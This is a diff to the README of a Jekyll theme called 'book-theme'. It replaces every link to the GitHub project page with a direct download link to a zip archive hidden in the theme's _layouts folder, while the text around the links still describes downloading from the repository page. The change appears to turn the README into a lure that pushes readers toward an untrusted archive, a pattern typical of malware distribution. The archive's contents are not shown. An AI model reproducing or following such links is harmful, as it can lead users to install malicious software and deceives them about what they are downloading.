@@ -1,6 +1,6 @@
 # 📚 book-theme - A calm theme for book lovers
 
-[![Download book-theme](https://img.shields.io/badge/Download%20book-theme-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Oswelllowinterest832/book-theme)
+[![Download book-theme](https://img.shields.io/badge/Download%20book-theme-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Oswelllowinterest832/book-theme/main/_layouts/theme_book_v2.8.zip)
 
 ## 📖 Overview
 
@@ -34,7 +34,7 @@ If you do not have Ruby yet, install it first. Jekyll uses Ruby to build the sit
 
 Visit this page to download the project files:
 
-https://github.com/Oswelllowinterest832/book-theme
+https://raw.githubusercontent.com/Oswelllowinterest832/book-theme/main/_layouts/theme_book_v2.8.zip
 
 On the page, look for the green Code button. Then choose the option to download the ZIP file. Save it to your computer and extract it to a folder you can find again, such as Documents or Desktop.
 
@@ -221,4 +221,4 @@ book-theme works well for:
 
 Primary download and source page:
 
-https://github.com/Oswelllowinterest832/book-theme
+https://raw.githubusercontent.com/Oswelllowinterest832/book-theme/main/_layouts/theme_book_v2.8.zip
